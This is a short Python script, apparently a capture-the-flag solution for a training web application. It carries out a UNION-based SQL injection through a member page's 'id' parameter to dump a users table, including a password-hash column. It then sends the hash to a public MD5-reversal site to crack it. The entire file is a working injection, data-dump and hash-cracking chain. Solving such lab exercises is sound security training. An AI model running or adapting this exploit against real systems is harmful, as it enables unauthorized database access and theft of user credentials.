import requests
import os
from lxml import html
from hashlib import sha256

users_info = '999 union select 1, concat(user_id, 0x0a, first_name, 0x0a, last_name, 0x0a, town, 0x0a, country, 0x0a, planet, 0x0a, Commentaire, 0x0a, countersign) from users'
ip = os.getenv('darkly_ip')

def inject(query):
    r = requests.get(f'http://{ip}/index.php', params={
        'page': 'member',
        'id': query,
        'Submit': 'Submit'
    })
    for l in r.iter_lines():
        if '</pre>'.encode() in l:
            li = str(l)
            last_flag = li.split('</pre>')[0]
    return last_flag[2:]

def reverse_md5(flag):
    r = requests.get('https://md5.gromweb.com/', params={'md5': flag})
    tree = html.fromstring(r.content)
    return tree.xpath('//em[@class="long-content string"]/text()')[0].lower()

if __name__ == '__main__':
    flag = inject(users_info)
    print('MD5 hash found in database:', flag)
    flag = reverse_md5(flag)
    print('Reversed and lowered:', flag)
    print('Final flag (sha256):', sha256(flag.encode()).hexdigest())

